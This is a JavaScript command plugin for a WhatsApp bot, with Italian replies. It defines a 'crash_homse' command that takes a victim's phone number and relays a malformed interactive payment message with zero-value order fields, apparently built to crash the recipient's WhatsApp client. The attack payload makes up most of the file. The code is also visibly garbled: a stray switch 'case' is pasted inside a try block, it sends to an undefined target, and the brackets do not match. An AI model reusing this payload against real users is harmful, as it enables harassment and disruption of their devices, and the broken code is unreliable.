let handler = async (m, { conn, args, command }) => {
  if (command === "crash_homse") {
    if (!args[0]) return m.reply("❌ Inserisci il numero!\nEsempio: .crash_home 393123456789")

    let numi = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"

    try {case 'g':{
await conn.relayMessage(from, {
    "messageContextInfo": {
        "deviceListMetadata": {
            "recipientKeyHash": "mmsUMggo7tQ8+g==",
            "recipientTimestamp": "1754274809"
        },
        "deviceListMetadataVersion": 2,
        "messageSecret": "ZOpQ279X/FepMc200ZJ/uz9haymINnZtTuc/a2IJetY="
    },
    "interactiveMessage": {
        "nativeFlowMessage": {
            "buttons": [
                {
                    "name": "payment_info",
                    "buttonParamsJson": "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"by 𝐆𝐎𝐃𝐙𝐈𝐌 𝑲𝑰𝑳𝑳𝑬𝑹.𝙼𝙿𝟻\",\"key\":\"NAO GRITA\",\"key_type\":\"EMAIL\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
                }
            ]
        }
    }
},{additionalNodes: [
                        {
                            tag: "biz",
                            attrs:
                            {
                                native_flow_name: "payment_info"
                            }
                        },
                    ]})
}
break
      })

      m.reply(`✅ Inviato a ${args[0]}`)
    } catch (e) {
      console.error(e)
      m.reply("⚠️ Errore durante l'invio.")
    }
  }
}

handler.command = /^crash_homse$/i
handler.owner = true

export default handler